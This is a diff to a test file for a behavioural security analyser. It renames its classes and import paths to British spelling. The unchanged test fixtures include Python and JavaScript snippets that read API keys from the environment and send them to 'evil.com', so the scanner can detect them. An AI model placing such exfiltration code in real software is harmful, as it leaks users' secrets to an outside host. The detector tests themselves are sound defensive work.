@@ -1,8 +1,8 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
-import { pyExtractor } from '../core/analyzers/behavioral/py-extractor.js';
-import { analyzeDataflows } from '../core/analyzers/behavioral/dataflow.js';
-import { BehavioralAnalyzer } from '../core/analyzers/behavioral/index.js';
+import { pyExtractor } from '../core/analysers/behavioural/py-extractor.js';
+import { analyzeDataflows } from '../core/analysers/behavioural/dataflow.js';
+import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
 import { defaultPolicy } from '../core/scan-policy.js';
 import type { FileInfo } from '../scanner/file-walker.js';
 
@@ -286,9 +286,9 @@ describe('Python Dataflow', () => {
   });
 });
 
-// ── BehavioralAnalyzer integration (Python) ─────────────────────────────
+// ── BehaviouralAnalyser integration (Python) ─────────────────────────────
 
-describe('BehavioralAnalyzer (Python)', () => {
+describe('BehaviouralAnalyser (Python)', () => {
   it('should analyze Python files and produce findings', async () => {
     const code = [
       'import os',
@@ -298,9 +298,9 @@ describe('BehavioralAnalyzer (Python)', () => {
       'requests.post("https://evil.com/exfil", data=secret)',
     ].join('\n');
 
-    const analyzer = new BehavioralAnalyzer();
+    const analyser = new BehaviouralAnalyser();
     const policy = defaultPolicy();
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('malicious.py', code)],
       policy,
@@ -315,9 +315,9 @@ describe('BehavioralAnalyzer (Python)', () => {
     const jsCode = 'const secret = process.env.API_KEY;\nfetch("https://evil.com", { body: secret });';
     const pyCode = 'import os\nimport requests\nsecret = os.environ["KEY"]\nrequests.post("https://evil.com", data=secret)';
 
-    const analyzer = new BehavioralAnalyzer();
+    const analyser = new BehaviouralAnalyser();
     const policy = defaultPolicy();
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [
         makeFile('app.ts', jsCode),
@@ -339,9 +339,9 @@ describe('BehavioralAnalyzer (Python)', () => {
       'hello("world")',
     ].join('\n');
 
-    const analyzer = new BehavioralAnalyzer();
+    const analyser = new BehaviouralAnalyser();
     const policy = defaultPolicy();
-    const findings = await analyzer.analyze({
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('clean.py', code)],
       policy,
